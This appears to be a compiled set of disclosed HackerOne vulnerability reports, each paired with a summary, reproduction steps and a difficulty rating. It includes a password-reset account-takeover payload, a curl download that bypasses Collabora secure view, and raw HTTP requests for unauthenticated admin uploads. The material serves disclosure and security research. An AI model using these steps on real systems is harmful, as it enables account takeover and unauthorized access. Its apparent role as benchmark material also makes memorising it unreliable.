The attack involves a straightforward CRLF injection to bypass authentication and then discovering an exposed websocket endpoint. The steps are relatively simple and do not require deep understanding of complex application states or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1168528: Improper authorization on `/api/as/v1/credentials/` allows any App Search user to access all API keys and escalate privileges
================================================================================
RAW DESCRIPTION:

Summary
Hello team, I hope you're doing well! App Search has a credentials page located at /as#/credentials that lists all the API keys a user has access to, if any. That same page will 404 for users with Analyst or Editor role. This is all working as intended, however there is also an API endpoint to query that same data at /api/as/v1/credentials/ and this will list all existing API keys for any authenticated user regardless of their App Search role.
Steps to reproduce
I'm going to use the cloud environment for the reproduction
Preparation
Log in App Search with the admin (elastic) user and go to the Users & roles page (/as#/role-mappings/)
Click Add mapping
In the Attribute value field enter h1-repro
In the Role box select Analyst
In the Engine Access select Limited Engine Access, no need to select any engine
We now have created the most limited role possible
We now have created the most limited role possible
Log in Kibana with the admin (elastic) user and go to the Stack Management > Users page (/app/management/security/users/)
Click Create user
In the Username field enter hi-repro
Set any password you like and then click Create user
Reproduction
Log in App Search with the h1-repro user
Navigate to /as#/role-mappings/ and observe that it's a 404 because you don't have access to this page
Navigate to /api/as/v1/credentials/ and observe that you have access to all the API keys
Impact
Privilege escalation. The default App Search install has a Private API Key with read/write access to all engines. If a Private Admin Key has been created before. the attacker can use it to create new API keys or delete existing ones.



================================================================================
Vulnerability Description:
The `/api/as/v1/credentials/` endpoint in App Search improperly authorizes access, allowing any authenticated user, regardless of role, to view all API keys, leading to potential privilege escalation.

Steps to Reproduce:
1. Log in to App Search with an admin (elastic) user and create a new user with the most limited role (Analyst) and no engine access.
2. Log in as the newly created limited user and access the `/api/as/v1/credentials/` endpoint to observe all API keys.
Exploitation Difficulty:
The vulnerability involves understanding role-based access control and API endpoint authorization, but the steps to reproduce are straightforward and do not require complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1175081: Full account takeover of any user through reset password
================================================================================
RAW DESCRIPTION:

Summary:
Hi Security team members,
Usually, If we reset our password on https://app.upchieve.org that time we got a password reset link on the email. And through that password reset link, we can reset our password.
But, I noticed that if we add another email in the request of forgot password through Burpsuite then both person will get the same password reset token in their email. So, an attacker can takeover any account without the user's interaction.
Steps To Reproduce:
Navigate to: https://app.upchieve.org/resetpassword
Then, enter the victim's email address
Intercept this request
Now, add your email also in the JSON body. like this:
Code 47 Bytes
1{"email":["victim@gmail.com","your@gmail.com"]}
Forward this request
<image_0>
By using that link which you just received in your email
You can fully takeover the victim's account by reset password.
POC:
Impact
It is a critical issue because an attacker can change any user's password without any user interaction.
This attack does not require any interaction from the victim to perform any actions and yet the account can be taken over by the attacker.
An attacker can fully takeover any user's account



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to take over any user's account by exploiting a flaw in the password reset functionality. By intercepting and modifying the password reset request to include both the victim's and attacker's email addresses, the same password reset token is sent to both emails, enabling the attacker to reset the victim's password without their interaction.

Steps to Reproduce:
1. Navigate to: https://app.upchieve.org/resetpassword
2. Enter the victim's email address and intercept the request using Burpsuite
3. Modify the JSON body to include both the victim's and attacker's email addresses: {"email":["victim@gmail.com","your@gmail.com"]}
4. Forward the modified request
5. Use the password reset link received in the attacker's email to reset the victim's password
Exploitation Difficulty:
The vulnerability involves intercepting and modifying a single HTTP request, which is a straightforward process with tools like Burpsuite. The flaw is in the server's handling of the password reset request, where it accepts an array of emails but only validates the first one, sending the same token to all provided emails. This behavior is not immediately obvious but can be discovered with basic testing of the password reset functionality.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1193321: Scoped apptokens can be changed by that very apptoken
================================================================================
RAW DESCRIPTION:

I noticed that there is the possibility to limit apptokens to not be able to access the filesystem.
Create a new apptoken in https://server/settings/user/security
Click the .. of your new apptoken and make it not allowed to access the filesystem
Log out
Navigate to https://server/remote.php/dav and login with your username + apptoken
Navigate again to https://server/settings/user/security
You won't be able to access the apptoken data
Obtain the CSRF token
Send a PUT request to https://server/settings/personal/authtokens/ID chaging the scope
Now the ID you do not know. However even on a decent sized system it is not hard to iterate this as there is no rate limiting or throttling at all.
And voila. You have filesystem access.
You could also remove other apptokens of the same user (if you'd want).
Impact
Leaked scoped tokens could be used to gain full access to all your data. Defeating the whole purpose of scoped tokens.
I recommend.
Only allow tokens that result from a real login (so user+pass+2fa) to modify/delete tokens
Do not allow the current token in use to edit itself



================================================================================
Vulnerability Description:
A scoped apptoken, which is supposed to have restricted access (e.g., no filesystem access), can be used to modify its own scope, thereby granting itself elevated privileges such as filesystem access. This defeats the purpose of scoped tokens and could lead to full system compromise if the token is leaked.

Steps to Reproduce:
1. Create a new apptoken in https://server/settings/user/security and restrict its filesystem access.
2. Use the restricted apptoken to authenticate and modify its own scope via a PUT request to https://server/settings/personal/authtokens/ID, bypassing the intended restrictions.
Exploitation Difficulty:
The vulnerability involves understanding the token scope modification process and exploiting the lack of checks preventing a token from modifying its own scope. While the steps are straightforward, the interaction between token authentication and scope modification is subtle and not immediately obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1194606: Virtual Data Room / Hide download on collabora is easy to bypass
================================================================================
RAW DESCRIPTION:

So, let me start with saying I'm not sure if this is a security issue or if it is by design. The reason I'm reporting it here is since Nextcloud promotes this Virtual Data Room a lot.
https://nextcloud.com/blog/nextcloud-announces-virtual-data-room-solution-for-ultimate-protection-of-data-during-sensitive-dealmaking/
https://nextcloud.com/virtual-data-room/
And let me just quote: "configure Secure View ensure the users can still read and (when shared with editing rights) modify documents, while the documents are watermarked when on screen."
"With secure view, our online office solutions can be configured to open PDF files, images and text files, making these files available in a watermark-protected way, while downloads and other apps are disabled using File Access Control. This setup is useful when data has to be protected from leaking but still has to be made available for review, as in a virtual data room scenario."
Both of these claims are false.
Minimal proof of concept.
Setup Nextcloud with Collabora
Setup sercure view & file access control to disallow the download of the files
Share a document, lets say vdr.odt by public link and mark as hide download
Copy the link
Now the point here is that anybody you send the link will only see the watermarked file. Not being able to download or copy data. And of course making a picture of these things is useless as it shows the watermark.
attacker opens their network tab in the developer tools
attacker opens the link
attacker filters on WOPISRC
Attacker finds a link like
Code 254 Bytes
1wss://collabora.server/https%3A%2F%2Fserver%2Findex.php%2Fapps%2Frichdocuments%2Fwopi%2Ffiles%2F1234_abcd%3Faccess_token%3efgh%26access_token_ttl%3D0/ws?WOPISrc=https%3A%2F%2Fserver%2Findex.php%2Fapps%2Frichdocuments%2Fwopi%2Ffiles%2F1234_abcd&compat=/ws
As far as I understand the WOPI spec this is us sending the collabora server the WOPI endpoint they have to call. Which in this case is
https://server/index.php/apps/richdocument/wopi/files/1234_abcd
The 1234_abcd seems to be the fileid and the instance id
And the access token is also there in the url. In this case efgh.
Now if an attacker just does the following curl command
Code 100 Bytes
1curl https://server/index.php/apps/richdocument/wopi/files/1234_abcd?access_token=efgh -o stolen.odt
You will see that they have the unwatermarked version of the data. This is even easier than copying everything over or making photographs.
Impact
Your Virtual Data Room is inherently broken. And the claims you make on your website are at best misleading.
However as said I'm not sure if this may be intentional as the feature is called hide download in the UI.
In any case. Maybe a good idea would be to have a secret configured on both collabora and the Nextcloud host. Which gets send. So that in case of hide download a client that doesn't know the secret token can't download the file.
I do not have access to a setup with Only Office. But I believe that to be vulnerable to a similar attack.



================================================================================
Vulnerability Description:
The Virtual Data Room's secure view feature in Nextcloud, which is supposed to prevent downloads and display watermarked documents, can be bypassed by intercepting the WOPISRC URL from Collabora and using it to download the original, unwatermarked file directly.

Steps to Reproduce:
1. Setup Nextcloud with Collabora and configure secure view & file access control to disallow downloads
2. Share a document via public link with 'hide download' enabled, then use developer tools to intercept the WOPISRC URL and download the file directly using curl
Exploitation Difficulty:
The vulnerability involves understanding the interaction between Nextcloud's secure view, Collabora's WOPI protocol, and how file access tokens are handled. While the steps to exploit are straightforward once the WOPISRC URL is identified, discovering this requires knowledge of how Collabora integrates with Nextcloud and the WOPI protocol specifics.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1195325: Default Admin Username and Password on █████ Server at █████████mil
================================================================================
RAW DESCRIPTION:

Description:
A ██████ Server is running at https://███mil you can access the login at https://████mil/█████████ the application is using the default "Administrator for the default organization" credentials
POC
Go to https://███mil/████████ and login with █████
██████████
████
████
How to remediate the vulnerability
Change the password of the user or disable the account
References
█████
https://cwe.mitre.org/data/definitions/521.html
EXTRA
If you have any questions or concerns regarding the above let me know!
Cheers,
Impact
A Department of Defense website was misconfigured in a manner that may have allowed a malicious user to login with administrator for the default organization account credentials.
System Host(s)
████mil
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Read the POC
Suggested Mitigation/Remediation Actions
Change the password of the user or disable the account



================================================================================
Vulnerability Description:
A Department of Defense website was misconfigured to use default admin credentials, allowing unauthorized access with the default username and password.

Steps to Reproduce:
1. Navigate to the login page at https://████mil/████████
2. Enter the default username 'Administrator for the default organization' and the default password
Exploitation Difficulty:
The vulnerability involves a straightforward use of default credentials, which is a common and well-documented issue. There are no complex interactions or states involved.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1210043: Enumerate all the class codes via google dorking 
================================================================================
RAW DESCRIPTION:

I used this particular google dork site:khanacademy.org/join/* to enumerate all the links of joining classes.
Go to google and use the above query to enumerate all of them.
Create the student account by filling all the required details
Now you're in the class without being actually invited by the teacher
Attached POC:
████████
Impact
An attacker can enumerate all the classes and join in them and make chaos there are chances of IDOR too... a class code can look like a57d5d5548f302ef4a instead of A45JST



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to enumerate all class join links on Khan Academy using a simple Google dork and join any class without an invitation, potentially causing disruption or accessing unauthorized information.

Steps to Reproduce:
1. Use the Google dork 'site:khanacademy.org/join/*' to enumerate all class join links.
2. Create a student account and use one of the enumerated links to join a class without an invitation.
Exploitation Difficulty:
The attack involves a straightforward Google dork query and does not require any complex interactions or understanding of subtle application logic. The vulnerability is easily discoverable with basic knowledge of Google dorks.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1218680: Improper authorization on `/api/as/v1/credentials/` for  Dev Role User with Limited Engine Access
================================================================================
RAW DESCRIPTION:

Summary:
Dear Team,
Since #1168528 was resolved. I have checking again for other roles. At Dev Role with Limited Engine Access, an user still can access API endpoint
/api/as/v1/credentials/ to get all API keys (private-key, search-key ... )
Steps To Reproduce:
1 - Log in Kibana with the admin (elastic) user and go to the Stack Management > Users page (/app/management/security/users/)
2 - Choose an username , password and role for this user. For example you can choose username: dev
3 - Log in App Search with the admin (elastic) user and go to the Users & roles page (/as#/role-mappings/)
4 - Click Add mapping
5 - External Attribute choose username , in the Attribute value field enter dev
6 - In the Role box select Dev
7 - In Engine Access select Limited Engine Access, no need to select any engine
8 - Login to App Search with user dev
9 - Go to endpoint https://your_app_search_instance/api/as/v1/credentials/
10 - You still can get all api keys
I have attached video PoC
█████████
Impact
Privilege escalation. The default App Search install has a Private API Key with read/write access to all engines. If a Private Admin Key has been created before. the attacker can use it to create new API keys or delete existing ones.
With Limited Engine Acess, an user should create and managed their own api keys



================================================================================
Vulnerability Description:
A user with Dev Role and Limited Engine Access can access the /api/as/v1/credentials/ endpoint to retrieve all API keys, including private keys, which should not be accessible with limited permissions. This allows privilege escalation as the user can use these keys to create or delete API keys.

Steps to Reproduce:
1. Log in to Kibana as admin (elastic) and navigate to Stack Management > Users
2. Create a new user 'dev' with Dev Role
3. Log in to App Search as admin and go to Users & roles
4. Add a new mapping for user 'dev' with Dev Role and Limited Engine Access
5. Log in to App Search as user 'dev'
6. Access the endpoint /api/as/v1/credentials/ to retrieve all API keys
Exploitation Difficulty:
The vulnerability involves understanding role-based access control in Kibana and App Search, and the interaction between user roles and API key permissions. The steps are straightforward but require knowledge of the system's role and permission structure.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1297480: Default Login Credentials on https://broadbandmaps.mtn.com.gh/ 
================================================================================
RAW DESCRIPTION:

Summary:
<image_0>
Supporting Material:
Impact
Access admin Panel due to Default credentials



================================================================================
Vulnerability Description:
The website https://broadbandmaps.mtn.com.gh/ uses default login credentials, allowing unauthorized access to the admin panel. This is a common security misconfiguration where default or weak credentials are not changed after deployment.

Steps to Reproduce:
1. Navigate to https://broadbandmaps.mtn.com.gh/
2. Attempt to log in using default credentials (e.g., admin/admin or similar commonly used defaults)
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves checking for default credentials, a common and well-documented practice in security testing. There are no complex interactions or states involved.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1394910: Unauthenticated Access to Admin Panel Functions at https://██████████/████████
================================================================================
RAW DESCRIPTION:

Description:
I discovered that the admin panel at https://████/█████ and all its functions can be accessed without authentication.
Impact
An attacker is able to use the administrative functions in order to upload, delete or modify files.
System Host(s)
████████
Affected Product(s) and Version(s)
██████'s ████████ (███) Management
CVE Numbers
Steps to Reproduce
Navigate to https://█████/ and click on the "█████████" button
Notice how the application first sends an HTTP POST request to https://█████████/█████ which gets answered with a redirect to https://█████/█████ which again redirects to https://███████/█████████
Looking at the response to https://█████████/███████ I noticed that even though the server sent back a 302 status code with a header Location: /█████ the response was quite long
I browsed to https://████████/████, intercepted the response in Burp, changed the status code from 302 Found to 200 OK and was presented with the admin panel (this kind of attack is called Execution after Redirect). Below you can see the unmodified response containing links to the ███ Admin Functions:
Code 4.64 KiB
1HTTP/1.1 302 Found
2Date: Mon, 08 Nov 2021 20:28:44 GMT
3Content-Type: text/html; charset=UTF-8
4Connection: close
5Cache-Control: no-store, no-cache, must-revalidate
6Expires: Thu, 19 Nov 1981 08:52:00 GMT
7Location: /███████
8Pragma: no-cache
9X-Vcap-Request-Id: f4014a06-51c2-44c3-4e4f-6db613c30484
10Strict-Transport-Security: max-age=31536000; includeSubDomains
11Content-Length: 4260
12
13
14<table align="center" width="800" border="1" cellspacing="1"
15	cellpadding="1" bgcolor="#008000">
16	<tr>
17		<td style="color: #FFF" ;="" align="center">LIMITED DISTRIBUTION<br> <font
18			size="2px">Distribution authorized to DoD, IAW 10 U.S.C. &#167&#167
19				130 &amp; 455. Release authorized to U.S. DoD contractors, IAW 48
20				C.F.R. &#167 252.245-7000. <br>Refer other requests to:
21				Headquarters, █████████, ATTN: Release Officer, █████████
22				████████. <br>Destroy IAW DoDD 5030.59.
23				Removal of this caveat is prohibited.
24		</font></td>
25	</tr>
26</table>
27<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
28<html lang='en' xmlns="http://www.w3.org/1999/xhtml">
29<head>
30<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
31<title>Admin</title>
32<script src="../███████p/SpryAssets/SpryMenuBar.js" type="text/javascript"></script>
33<link href="../█████████p/SpryAssets/SpryMenuBarHorizontal.css"
34	rel="stylesheet" type="text/css" />
35</head>
36
37<body>
38	<table align="center" bgcolor="#82F379" border="3">
39		<tr>
40			<td colspan="2" align="center"><img
41				src="../██████p/images/███_banner_top.jpg" /></td>
42		</tr>
43		<tr>
44			<td align="center"><br />
45            ████ You are on NIPR NET RESTRICTIVE<br /></td>
46		</tr>
47		<tr>
48			<td>
49				<div align="center">
50					<ul id="MenuBar1" class="MenuBarHorizontal">
51						<li><a class="MenuBarItemSubmenu" href="#">Home</a></li>
52						<li><a class="MenuBarItemSubmenu" href="#">███████ Admin Functions</a>
53							<ul>
54								<li><a href="s3html.php">UpLoad Weekly</a></li>
55								<li><a href="../████p/████████/verifyfile.php">Verify File Dates</a></li>
56								<li><a href="#">Add Single File</a>
57									<ul>
58										<li><a href="../████p/███/addnewfile.php" target="new">VDU ADD
59										</a></li>
60										<li><a href="../████p/████████/addvpf.php" target="new">VPF ADD</a></li>
61										<li><a href="../███████p/████████/████████class.php" target="new">Change
62												Classification</a></li>
63										<li><a href="../██████████p/██████/███████████████">New █████</a></li>
64										<li><a href="../████p/████/██████loadgraph.php" target="new">Graphic
65												ADD</a></li>
66										<li><a href="../███p/██████/████delgrp.php">Delete 'ALL' Graphic
67												Files</a></li>
68									</ul></li>
69								<li><a href="#">Upload New Editions</a>
70									<ul>
71										<li><a href="../███p/█████/██████████loadvdu.php" target="new">Install
72												New Base VDU </a></li>
73										<li><a href="../█████p/█████/████████loadvpf.php" target="new">Install
74												New base VPF </a></li>
75										<li><a href="../█████████p/███/█████████loadtxt.php" target="new">Install/Update
76												██████##.txt</a></li>
77										<li><a href="../█████p/██████████/████newgraph.php" target="new">Replace
78												all Graphic Files</a></li>
79									</ul></li>
80								<li><a href="#">Modify Single File**</a>
81									<ul>
82										<li><a href="../████████p/█████████/███mod.php">Modify ██████ Chart</a></li>
83										<li><a href="../████p/██████████/██████████vitem.php">Modify Library Specific
84												File</a></li>
85										<li><a href="../███p/██████████/█████viteml.php">Stop ALL VPFS from
86												being viewed from specific Region</a></li>
87										<li><a href="../███p/██████/██████████graphic.php">Modify Graphic
88												Specific File</a></li>
89									</ul></li>
90								<li><a href="../█████████p/████/██████████vpfdel.php">DELETE VPF, VDU,
91										Graphics</a></li>
92								<li><a href="#">Change Status of Deleted and New Records</a>
93									<ul>
94										<li><a href="../██████████p/███/█████deldel.php">Change Record Status
95												To an ADDed or DELeted VDU Record</a></li>
96									</ul></li>
97								<li><a href="../█████████p/█████/████████_documentation.php">██████████
98										Documentation</a></li>
99							</ul></li>
100						<li><a href="dssLogout.php">Logout</a></li>
101					</ul>
102				</div>
103				<p>&nbsp;</p>
104				<p>&nbsp;</p>
105				<p>
106					<br /> <br />
107				</p>
108			</td>
109		</tr>
110		<tr>
111			<td><br /> <br /></td>
112		</tr>
113		<tr align="center">
114		</tr>
115	</table>
116	<script type="text/javascript">
117    var MenuBar1 = new Spry.Widget.MenuBar("MenuBar1", {imgDown:"../SpryAssets/SpryMenuBarDownHover.gif", imgRight:"../SpryAssets/SpryMenuBarRightHover.gif"});
118</script>
119</body>
120</html>
121
The functions allow to upload, modify and to delete ████ files and can all be used completely unauthenticated. Following an example in which I upload a file; this upload function can be accessed from https://███/elist/s3html.php. Note that the request has no session cookie:
Code 1.44 KiB
1POST /██████████ HTTP/1.1
2Host: ███
3Content-Length: 899
4Cache-Control: max-age=0
5Upgrade-Insecure-Requests: 1
6Origin: https://█████
7Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT4r0MDX8IcQqr8D9
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
9Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
10Referer: https://██████████/elist/s3html.php
11Accept-Encoding: gzip, deflate
12Accept-Language: en-US,en;q=0.9
13Connection: close
14
15------WebKitFormBoundaryT4r0MDX8IcQqr8D9
16Content-Disposition: form-data; name="nNtM"
17
1813/37
19------WebKitFormBoundaryT4r0MDX8IcQqr8D9
20Content-Disposition: form-data; name="oNtM"
21
2213/37
23------WebKitFormBoundaryT4r0MDX8IcQqr8D9
24Content-Disposition: form-data; name="update"
25
262021-11-08
27------WebKitFormBoundaryT4r0MDX8IcQqr8D9
28Content-Disposition: form-data; name="nxtdate"
29
302021-12-06
31------WebKitFormBoundaryT4r0MDX8IcQqr8D9
32Content-Disposition: form-data; name="regionSelect"
33
3401
35------WebKitFormBoundaryT4r0MDX8IcQqr8D9
36Content-Disposition: form-data; name="type"
37
38windows
39------WebKitFormBoundaryT4r0MDX8IcQqr8D9
40Content-Disposition: form-data; name="userfile1[]"; filename="test.txt"
41Content-Type: text/plain
42
43test
44
45------WebKitFormBoundaryT4r0MDX8IcQqr8D9
46Content-Disposition: form-data; name="buttonm"
47
48Begin Uploads
49------WebKitFormBoundaryT4r0MDX8IcQqr8D9--
50
Response:
Code 870 Bytes
1HTTP/1.1 302 Found
2Date: Mon, 08 Nov 2021 21:03:35 GMT
3Content-Type: text/html; charset=UTF-8
4Connection: close
5Cache-Control: no-store, no-cache, must-revalidate
6Expires: Thu, 19 Nov 1981 08:52:00 GMT
7Location: 404.html
8Pragma: no-cache
9Set-Cookie: JSESSIONID=0g33q2a5b6hkj02pv9hro94dqa; path=/; HttpOnly
10Set-Cookie: __VCAP_ID__=7aa1d3ae-4d04-4a15-6476-fac8; Path=/; HttpOnly; Secure
11X-Vcap-Request-Id: c7bd3c85-075f-43d3-4a45-7f494a6cc748
12Strict-Transport-Security: max-age=31536000; includeSubDomains
13Set-Cookie: TS01485890=01d8bb34a4a839126a96d80bd04820274929fd7bd07f6a640cdcbc306946f3965158fe2cdee1ce628fee6943b7320cf7b62b158749; Path=/
14Content-Length: 337
15
16<br> path is /███████<br> get outtest.txt<br>S3 keyname: ██████████p/█████████test.txt<br>i = 0, Upload SUCCESS!<br>S3 ObjectURL: https://███████/████p/███████████████test.txt<br>error in ██████charts table 
Suggested Mitigation/Remediation Actions
Implement proper access controls.
Mitigation for the Execution after Redirect vulnerability: Proper termination should be performed after redirects. In a function a return should be performed. In other instances functions such as die() should be performed. This will tell the application to terminate regardless of if the page is redirected or not.



================================================================================
Vulnerability Description:
Unauthenticated access to admin panel functions due to an Execution after Redirect vulnerability, allowing attackers to upload, delete, or modify files without authentication.

Steps to Reproduce:
1. Navigate to https://█████/ and click on the "█████████" button
2. Intercept the response in Burp, change the status code from 302 Found to 200 OK to access the admin panel
Exploitation Difficulty:
The vulnerability involves a straightforward manipulation of HTTP response codes to bypass authentication, without requiring complex interactions or understanding of multiple components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1397564: Unauthenticated Access to Admin Panel Functions at https://███████/███
================================================================================
RAW DESCRIPTION:

Description:
The admin panel at https://██████████/████████ and all its functions can be accessed without authentication. This is basically the same vulnerability as in #1394910, just on another system.
Impact
An attacker is able to use the administrative functions in order to upload, delete or modify files.
System Host(s)
███
Affected Product(s) and Version(s)
██████████
CVE Numbers
Steps to Reproduce
Navigate to https://███/ and click on the "Authenticate ██████████" button
Notice how the application first sends an HTTP POST request to https://███████/████████ which should redirect to https://██████/██████████ (Location: █████). Navigating to https://███/██████ redirects to https://█████/███
Looking at the response to https://█████/███ I noticed that even though the server sent back a 302 status code with a header Location: /██████████ the response was quite long
I browsed to https://█████████/████████, intercepted the response in Burp, changed the status code from 302 Found to 200 OK and was presented with the admin panel (this kind of attack is called Execution after Redirect). Below you can see the unmodified response containing links to the ██████ Admin Functions:
Code 4.75 KiB
1HTTP/1.1 302 Found
2Date: Wed, 10 Nov 2021 14:28:15 GMT
3Content-Type: text/html; charset=UTF-8
4Connection: close
5Cache-Control: no-store, no-cache, must-revalidate
6Expires: Thu, 19 Nov 1981 08:52:00 GMT
7Location: /██████
8Pragma: no-cache
9Set-Cookie: █████████; path=/; HttpOnly
10Set-Cookie: ███████; Path=/; HttpOnly; Secure
11X-Vcap-Request-Id: 3c110e5d-196e-46f4-503d-222157e0c465
12Strict-Transport-Security: max-age=31536000; includeSubDomains
13██████████████████
14Content-Length: 4266
15
16
17<!-- Unused LIMDIS banner in WWW  
18
19<table align="center" width="800" border="1" cellspacing="1"
20	cellpadding="1" bgcolor="#008000">
21	<tr>
22		<td style="color: #FFF";  align="center">LIMITED DISTRIBUTION<br> <font
23			size="2px">Distribution authorized to DoD, IAW 10 U.S.C. §§ 130 &
24				455. Release authorized to U.S. DoD contractors, IAW 48 C.F.R. §
25				252.245-7000. Refer other requests to: Headquarters, ██████████, ATTN:
26				Release Of ficer, ███████, ██████,
27				█████. Destroy IAW DoDI 5030.59. Removal of this caveat is
28				prohibited.</font></td>
29	</tr>
30</table>
31--><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
32<html lang='en' xmlns="http://www.w3.org/1999/xhtml">
33<head>
34<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
35<title>Admin</title>
36<script src="../███████/SpryAssets/SpryMenuBar.js" type="text/javascript"></script>
37<link href="../█████/SpryAssets/SpryMenuBarHorizontal.css"
38	rel="stylesheet" type="text/css" />
39</head>
40
41<body>
42	<table align="center" bgcolor="50D6EE" border="3">
43		<tr>
44			<td colspan="2" align="center"><img
45				src="../███████/images/███_banner_top.jpg" /></td>
46		</tr>
47		<tr>
48			<td align="center"><br />
49            Welcome to ███  You are on World Wide Web<br /></td>
50		</tr>
51		<tr>
52			<td>
53				<div align="center">
54					<ul id="MenuBar1" class="MenuBarHorizontal">
55						<li><a class="MenuBarItemSubmenu" href="#">Home</a></li>
56						<li><a class="MenuBarItemSubmenu" href="#">█████ Admin Functions</a>
57							<ul>
58								<li><a href="s3html.php">UpLoad Weekly</a></li>
59								<li><a href="../███/██████/verifyfile.php">Verify File Dates</a></li>
60								<li><a href="#">Add Single File</a>
61									<ul>
62										<li><a href="../██████████/██████████/addnewfile.php" target="new">VDU ADD
63										</a></li>
64										<li><a href="../██████/██████████/addvpf.php" target="new">VPF ADD</a></li>
65										<li><a href="../██████████/█████/█████class.php" target="new">Change
66												Classification</a></li>
67										<li><a href="../████████/██████/██████████bull.php">New ███</a></li>
68										<li><a href="../██████████/█████████/███████loadgraph.php" target="new">Graphic
69												ADD</a></li>
70										<li><a href="../██████/████████/██████delgrp.php">Delete 'ALL' Graphic
71												Files</a></li>
72									</ul></li>
73								<li><a href="#">Upload New Editions</a>
74									<ul>
75										<li><a href="../████████/█████/██████loadvdu.php" target="new">Install
76												New Base VDU </a></li>
77										<li><a href="../███/██████████/█████loadvpf.php" target="new">Install
78												New base VPF </a></li>
79										<li><a href="../█████████/██████████/███████loadtxt.php" target="new">Install/Update
80												█████████##.txt</a></li>
81										<li><a href="../███████/███████/███████newgraph.php" target="new">Replace
82												all Graphic Files</a></li>
83									</ul></li>
84								<li><a href="#">Modify Single File**</a>
85									<ul>
86										<li><a href="../██████/█████████/██████mod.php">Modify ██████████ Chart</a></li>
87										<li><a href="../██████████/███████/█████vitem.php">Modify Library Specific
88												File</a></li>
89										<li><a href="../████████/███/█████viteml.php">Stop ALL VPFS from
90												being viewed from specific Region</a></li>
91										<li><a href="../█████/███/█████████graphic.php">Modify Graphic
92												Specific File</a></li>
93									</ul></li>
94								<li><a href="../███████/████/██████████vpfdel.php">DELETE VPF, VDU,
95										Graphics</a></li>
96								<li><a href="#">Change Status of Deleted and New Records</a>
97									<ul>
98										<li><a href="../████/█████/████████deldel.php">Change Record Status
99												To an ADDed or DELeted VDU Record</a></li>
100									</ul></li>
101								<li><a href="../████/█████/█████_documentation.php">████
102										Documentation</a></li>
103							</ul></li>
104						<li><a href="dssLogout.php">Logout</a></li>
105					</ul>
106				</div>
107				<p>&nbsp;</p>
108				<p>&nbsp;</p>
109				<p>
110					<br /> <br />
111				</p>
112			</td>
113		</tr>
114		<tr>
115			<td><br /> <br /></td>
116		</tr>
117		<tr align="center">
118		</tr>
119	</table>
120	<script type="text/javascript">
121    var MenuBar1 = new Spry.Widget.MenuBar("MenuBar1", {imgDown:"../SpryAssets/SpryMenuBarDownHover.gif", imgRight:"../SpryAssets/SpryMenuBarRightHover.gif"});
122</script>
123</body>
124</html>
125
The functions allow to upload, modify and to delete █████ files and can all be used completely unauthenticated. Following an example in which I upload a file; this upload function can be accessed from https://█████/██████/████/█████████bull.php. Note that the request has no session cookie:
Code 1.06 KiB
1POST /████/███████/███████bulla.php HTTP/1.1
2Host: █████
3Content-Length: 401
4Cache-Control: max-age=0
5Upgrade-Insecure-Requests: 1
6Origin: https://█████
7Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVxWfTBx5ZkXMXVG2
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
9Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
10Referer: https://███████/█████/████/████████bull.php
11Accept-Encoding: gzip, deflate
12Accept-Language: en-US,en;q=0.9
13Connection: close
14X-Bug-Bounty: HackerOne-palaziv
15X-Bug-Bounty: BurpSuitePro
16
17------WebKitFormBoundaryVxWfTBx5ZkXMXVG2
18Content-Disposition: form-data; name="bdate"
19
201970-01-01
21------WebKitFormBoundaryVxWfTBx5ZkXMXVG2
22Content-Disposition: form-data; name="userfile1"; filename="test.txt"
23Content-Type: text/plain
24
25test
26
27------WebKitFormBoundaryVxWfTBx5ZkXMXVG2
28Content-Disposition: form-data; name="buttonm"
29
30Begin Uploads
31------WebKitFormBoundaryVxWfTBx5ZkXMXVG2--
Response:
Code 843 Bytes
1HTTP/1.1 302 Found
2Date: Wed, 10 Nov 2021 14:44:57 GMT
3Content-Type: text/html; charset=UTF-8
4Connection: close
5Cache-Control: no-store, no-cache, must-revalidate
6Expires: Thu, 19 Nov 1981 08:52:00 GMT
7Location: ../../█████████/404.html
8Pragma: no-cache
9Set-Cookie: JSESSIONID=fceoa3cccho3q5dc6ahec3ghav; path=/; HttpOnly
10Set-Cookie: ███; Path=/; HttpOnly; Secure
11X-Vcap-Request-Id: ffb083d0-f29b-4623-5249-9f015b9cc59f
12Strict-Transport-Security: max-age=31536000; includeSubDomains
13Set-Cookie: TS01b8cd54=01dc86b24807c4064ee7333f073dd2db329d550bf5a80b061306a56af136c21560cefb7fa74dbd19a258797185afd48dfdfb9f2dca; Path=/; Domain=.█████████
14Content-Length: 173
15
<image_0>
This uploaded file can be downloaded again on https://█████████.██████████/████/███/███.php (another system) by clicking on the "██████████ ███████" link: https://██████.█████████/█████████/██████████/downloadS3File.php?file=███%2F██████SiteContent%2F███████.zip
Suggested Mitigation/Remediation Actions
Implement proper access controls.
